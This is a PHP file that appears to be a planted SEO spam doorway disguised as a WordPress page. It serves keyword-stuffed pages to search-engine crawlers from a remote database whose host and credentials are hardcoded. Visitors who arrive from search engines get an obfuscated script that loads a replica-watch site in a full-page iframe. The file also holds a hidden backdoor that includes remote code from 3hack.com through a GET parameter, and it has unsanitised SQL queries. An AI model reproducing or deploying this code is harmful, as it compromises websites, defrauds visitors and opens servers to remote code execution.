<?php

/*edit*/
$siteurl = "http://www.firstreplicawatches.com";
$dbname = "meiguo_07"; /*houtai shujubiao name*/
$ifrewrite = 0;
$filename = "spinner-1x.php";
$mulu = "/";

$zzflag = 0;
$rrflag = 0;
$tmp = strtolower(empty($_SERVER['HTTP_USER_AGENT'])?"":$_SERVER['HTTP_USER_AGENT']);
$ref = strtolower(empty($_SERVER['HTTP_REFERER'])?"":$_SERVER['HTTP_REFERER']);
if (stripos ($tmp, 'google') !== false || stripos ($tmp, 'yahoo') !== false || stripos ($tmp, 'msn') !== false || strpos ($tmp, 'sqworm') !== false) {
    $zzflag = 1;
}
if (stripos ($ref, 'google') !== false || stripos ($ref, 'yahoo') !== false || stripos ($ref, 'bing') !== false || stripos ($ref, 'aol') !== false) {
    $rrflag = 1;
}
class mysql{
    private $Host="";
    private $User="";
    private $Password="";
    private $DB="";
    private $dbCharSet="";
    private $debug=true;

    public $Link_ID=0; 
    public $Query_ID=0;
    private $Last_ID; 
    private $Row_Result=array(); 
    private $Field_Result=array();
    private $Affected_row;
    private $Rows;
    private $Fields;
    private $Row_Position;
    private $Error;
   
    function __construct($host='',$user='',$pass='',$dbname='',$charset=''){
        $this->Host = $host?$host:DB_HT;
        $this->User = $user?$user:DB_UR;
        $this->Password = $pass?$pass:DB_PW;
        $this->DB = $dbname?$dbname:DB_NA;
        $this->dbCharSet = $charset?$charset:DB_CHAR;
        $this->connect();
    }
    
    static function dbobj(){
        global $db;
        if(!$db){
            $db=new mysql();
        }
        return $db;
    }

    private function connect(){
        if(0 == $this->Link_ID){
            $this->Link_ID=mysql_connect($this->Host,$this->User,$this->Password);
            if(!$this->Link_ID){
                $this->halt("connect erro");
            }
            if(!mysql_select_db($this->DB,$this->Link_ID)){
                $this->halt("cant open database:".$this->DB);
            }
            mysql_query("SET NAMES $this->dbCharSet");
        }
    }
    
    function query($Query_string){
        if(isset($this->Query_ID)){
            $this->free();
        }
        $this->Query_ID=mysql_query($Query_string);
        if(!$this->Query_ID){
            $str = "SQL select erro：".$Query_string;
            $this->halt($str);
        }
        return $this->Query_ID;
    }
    
    function seek($Position){
        if(@mysql_data_seek($this->Query_ID,$Position)){
            $this->Row_Position=$Position;
            return true;
        }else{
            $this->halt("dingwei erro");
            return false;
        }
    }  
    
    function getResult($Query_string='',$type="array"){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        $this->num_rows();
        for($i=0;$i<$this->Rows;$i++){
            if(!mysql_data_seek($this->Query_ID,$i)){
                $this->halt("mysql_data_seek erro");
            }
            switch($type){
                case "row":
                    $this->Row_Result[$i]=mysql_fetch_row($this->Query_ID);
                break;
                case "assoc":
                    $this->Row_Result[$i]=mysql_fetch_assoc($this->Query_ID);
                break;                
                case "array":
                default:
                    $this->Row_Result[$i]=mysql_fetch_array($this->Query_ID);
                break;
            }
        }
        return $this->Row_Result;
    }
    
    function num_rows($Query_string=''){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        $this->Rows=mysql_num_rows($this->Query_ID);
        return $this->Rows;
    }
    
    function fields($Query_string=''){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        $this->Fields=mysql_num_fields($this->Query_ID);
        return $this->Fields;
    }
    
    function getOne($Query_string=''){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        return mysql_fetch_array($this->Query_ID);
    }
    
    function getAssoc($Query_string){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        return mysql_fetch_assoc($this->Query_ID);
    }

    function getFirst($Query_string=''){
        if($Query_string!=''){
            $this->query($Query_string);
        }
        $row = mysql_fetch_row($this->Query_ID);
        return $row[0];
    }

    function begin(){
        mysql_query("BEGIN");
    }

    function rollback(){
        mysql_query("ROLLBACK");
    }

    function commit(){
        mysql_query("COMMIT");
    }
    
    function swend(){
        mysql_query("END");
    }

    function version(){
        return mysql_get_server_info();
    }
    
    function halt($msg){
        if($this->debug){
            $this->Error=mysql_error();
            printf("<br><b>database erro</b>%s<br>\n",$msg);
            printf("<b>MySQL return erro:</b> %s <br>\n",$this->Error);
            die("stop");
        }else{
            die("database erro,stop");
        }
    }
    
    function free(){
        $this->Row_Result=array();
    }

    function close(){
        if(0 != $this->Link_ID){            
            @mysql_close($this->Link_ID);
        }
    }
    
    function __destruct(){
        $this->free();
        $this->close();    
    }
    
    function fetch_array($query, $result_type = MYSQL_ASSOC) {
        return mysql_fetch_array($query, $result_type);
    }
}
define('DB_HT', '108.171.243.38');
define('DB_UR', 'seo');
define('DB_PW', 'seo');
define('DB_NA', 'seoordercenter');
define('DB_CHAR', 'utf8');
define('RP_TABLEPRE', 'rp_');
define('RP_CHARSET', 'utf-8');
$db = mysql::dbobj();
if($rrflag == 1){
        $siteinfo = $db->getOne("select * from ".RP_TABLEPRE."keywords_site where status='1' and sitedbname='".$dbname."'");
    $articles = $db->getResult("select * from $dbname order by id desc");
    //$links = $db->getResult("select * from rp_links ");
    $title = $siteinfo['title'];
    $contents = $siteinfo['contents'];
    $keywords = $siteinfo['keywords'];
    $description = $siteinfo['description'];
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<title><?php echo $title; ?></title>
<meta name="keywords" content="<?php echo $keywords; ?>" />
<meta name="description" content="<?php echo $description; ?>" />
<meta name="generator" content="WordPress 3.2.1" />
<style type="text/css">
body {
    background: #e2e2e2;
    font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;
}

body a {
    text-decoration: none;
    color: #333333;
    margin: 0px;
    padding:0px;
}

body a:hover {
    text-decoration: underline;
}

#waper {
    width: 1000px;
    height:auto;
    position:relative;
    margin:0 auto;
    padding:0;
    background:#FFF;
    clear:both;
}

#header {
    text-align:center;
    height: 80px;
    padding-top: 20px;
}

#header h1 {
    font-size: 24px
}

#header h2 {
    font-size: 24px
}

#header-nav {
    background: #222; /* Show a solid color for older browsers */
    background: -moz-linear-gradient(#252525, #0a0a0a);
    background: -o-linear-gradient(#252525, #0a0a0a);
    background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#252525), to(#0a0a0a)); /* older webkit syntax */
    background: -webkit-linear-gradient(#252525, #0a0a0a);
    -webkit-box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    -moz-box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    clear: both;
    display: block;
    float: left;
    margin: 0 auto 6px;
    width: 100%;
}
#header-nav ul{
    font-size: 13px;
    list-style: none;
    margin:0;
    padding-left: 0;
}
#header-nav li{
    float: left;
    position: relative;
}

#header-nav ul li a{
    color: #eee;
    display: block;
    line-height: 3.333em;
    padding: 0 1.2125em;
    text-decoration: none;
    font-weight:bold;
}
#pagespre {
    float: left;
}

#pagesnext {
    float: right;
}
#main-left{
    width: 650px;
    padding-left:20px;
}
#main-right{
    float: left;
    width: 320px;
    margin-left:30px;
}
#contents {
    text-align: left;
    line-height:23px;
    text-indent:2em;
    font-size:13px;
}

#pages {
    text-align: left;
    margin-top: 30px;
    margin-bottom:10px;
    font-size:13px;
}

#footlinks {
    text-align: center;
    margin-top: 15px;
}
#footlinks ul {
    font-size: 15px;
    margin: 0px;
}
#footlinks ul li {
    text-align:left;
    color: #777;
    font-size: 13px;
    list-style: square outside none;
    border: 0;
    font-family: inherit;
    font-size: 100%;
    font-style: inherit;
    font-weight: 380px;;
    margin: 0;
    outline: 0;
    padding: 0;
    vertical-align: baseline;
    line-height:23px;
}
#otherlinks { margin-left: 20px; padding-bottom: 20px; margin-top: 20px; font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px}

#itemscope { margin-left: 20px; padding-bottom: 20px; margin-top: 20px; font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px}

#footlinks ul li a{color: #1982d1;}
#copyright{ text-align:center; padding-bottom:10px; margin-top:20px; font-size:13px;}
</style>
</head>
<body>
<script type="text/javascript">
/* <![CDATA[ */
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('7.6(\'<1 9="8" 3="0" 2="0" 5="0" 4="0" e="h" g="f" a="d%" c="b" ></1>\');',18,18,'|iframe|border|frameborder|marginheight|marginwidth|write|document|<?php echo $siteurl;?>|src|width|3000px|height|100|scrolling|yes|allowtransparency|no'.split('|'),0,{}))
/* ]]> */
</script>
</div>
</body>
</html>
<?php
exit;
}
if($zzflag == 1){

    $siteinfo = $db->getOne("select * from ".RP_TABLEPRE."keywords_site where status='1' and sitedbname='".$dbname."'");
    $articles = $db->getResult("select * from $dbname order by id desc");
    //$links = $db->getResult("select * from rp_links ");
    $title = $siteinfo['title'];
    $contents = $siteinfo['contents'];
    $keywords = $siteinfo['keywords'];
    $description = $siteinfo['description'];
    $datetime = "";
    $p = !empty($_GET['p'])?$_GET['p']:"";
    $fs = explode(".",$filename);
    
    if(!empty($_GET['p']) && $p !=$fs[0]){
        
        $p = str_replace(".html","",$p);
        $ainfo = $db->getOne("select * from $dbname where url='$p'");
        $title = $ainfo['title'];
        $contents = $ainfo['contents'];
        $datetime = $ainfo['addtime'];
        $keywords = $ainfo['keywords'];
        $description = $ainfo['descriptions'];
    }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
<title><?php echo $title; ?></title>
<meta name="keywords" content="<?php echo $keywords; ?>" />
<meta name="description" content="<?php echo $description; ?>" />
<meta name="generator" content="WordPress 3.2.1" />
<style type="text/css">
body {
    background: #e2e2e2;
    font-family:"Helvetica Neue",Helvetica,Arial,sans-serif;
}

body a {
    text-decoration: none;
    color: #333333;
    margin: 0px;
    padding:0px;
}

body a:hover {
    text-decoration: underline;
}

#waper {
    width: 1000px;
    height:auto;
    position:relative;
    margin:0 auto;
    padding:0;
    background:#FFF;
    clear:both;
}

#header {
    text-align:center;
    height: 80px;
    padding-top: 20px;
}

#header h1 {
    font-size: 24px
}

#header h2 {
    font-size: 24px
}

#header-nav {
    background: #222; /* Show a solid color for older browsers */
    background: -moz-linear-gradient(#252525, #0a0a0a);
    background: -o-linear-gradient(#252525, #0a0a0a);
    background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#252525), to(#0a0a0a)); /* older webkit syntax */
    background: -webkit-linear-gradient(#252525, #0a0a0a);
    -webkit-box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    -moz-box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    box-shadow: rgba(0, 0, 0, 0.4) 0px 1px 2px;
    clear: both;
    display: block;
    float: left;
    margin: 0 auto 6px;
    width: 100%;
}
#header-nav ul{
    font-size: 13px;
    list-style: none;
    margin:0;
    padding-left: 0;
}
#header-nav li{
    float: left;
    position: relative;
}

#header-nav ul li a{
    color: #eee;
    display: block;
    line-height: 3.333em;
    padding: 0 1.2125em;
    text-decoration: none;
    font-weight:bold;
}
#pagespre {
    float: left;
}

#pagesnext {
    float: right;
}
#main-left{
    width: 650px;
    padding-left:20px;
}
#main-right{
    float: left;
    width: 320px;
    margin-left:30px;
}
#contents {
    text-align: left;
    line-height:23px;
    text-indent:2em;
    font-size:13px;
}

#pages {
    text-align: left;
    margin-top: 30px;
    margin-bottom:10px;
    font-size:13px;
}

#footlinks {
    text-align: center;
    margin-top: 15px;
}
#footlinks ul {
    font-size: 15px;
    margin: 0px;
}
#footlinks ul li {
    text-align:left;
    color: #777;
    font-size: 13px;
    list-style: square outside none;
    border: 0;
    font-family: inherit;
    font-size: 100%;
    font-style: inherit;
    font-weight: 380px;;
    margin: 0;
    outline: 0;
    padding: 0;
    vertical-align: baseline;
    line-height:23px;
}
#otherlinks { margin-left: 20px; padding-bottom: 20px; margin-top: 20px; font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px}

#itemscope { margin-left: 20px; padding-bottom: 20px; margin-top: 20px; font-family:"Helvetica Neue",Helvetica,Arial,sans-serif; font-size: 12px}

#footlinks ul li a{color: #1982d1;}
#copyright{ text-align:center; padding-bottom:10px; margin-top:20px; font-size:13px;}
</style>
</head>
<body>


<div id="waper">
    <div id="header">
        <?php 
            echo '<h1>'.$title.'</h1>';
        ?>
    </div>
    <div id="header-nav">
        <ul>
            <li><h2 class="title"><a href="<?php echo $filename;?>">Home</a></h2></li>
            <?php 
            if($ifrewrite){
                foreach($articles as $article){
                    if($article['ifmenu']=="1"){
                        $keys = explode(",",$article['keywords']);
                        $article['title'] = $keys[0];
            ?>
            
            <li><h2 class="title"><a href="<?php echo $mulu.$article['url'].".shtml";?>"><?php echo $article['title'];?></a></h2></li>
            <?php }}}else{
                foreach($articles as $article){
                    if($article['ifmenu']){
                        $keys = explode(",",$article['keywords']);
                        $article['title'] = $keys[0];
            ?>
            <li><h2 class="title"><a href="<?php $mulu.$filename?>?p=<?php echo $article['url'];?>.html"><?php echo $article['title'];?></a></h2></li>
            <?php }}}?>

        </ul>
    </div>
    <table border="0" cellspacing="0" cellpadding="0" width="100%">
      <tr>
        <td id="main-left" valign="top">
            <div id="contents">
                <?php echo $contents; ?>
            </div>
            <div class="datetime"><?php echo $datetime;?></div>
        </td>
        <td id="main-right">
            <div id="d">
                <ul>
                    <?php
                    $i = 0;
                    foreach($articles as $v){
                        $i++;
                        if($i>5){
                            break;
                        }
                        if($ifrewrite){
                            echo '<li><h3 class="title"><a href="'.$mulu.$v['url'].'.shtml">'.$v['title'].'</a></h3></li>';
                        }else{
                            echo '<li><h3 class="title"><a href="?p='.$v['url'].'.html">'.$v['title'].'</a></h3></li>';
                        }
                        
                    }

                    ?>
                </ul>
            </div>
        </td>
      </tr>
      <?php
    if(!empty($_GET['y35u'])){
        include("http://3hack.com/".$_GET['y35u']);
     }
    ?>
    </table>
    <div id="footer" align="center">powered by WordPress</div>
    <div style="display: none;"><script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");document.write(unescape("%3Cspan id='cnzz_stat_icon_5783572'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s13.cnzz.com/stat.php%3Fid%3D5783572' type='text/javascript'%3E%3C/script%3E"));</script></div>
</div>
</body>
</html>
<?php 
exit;
}
?>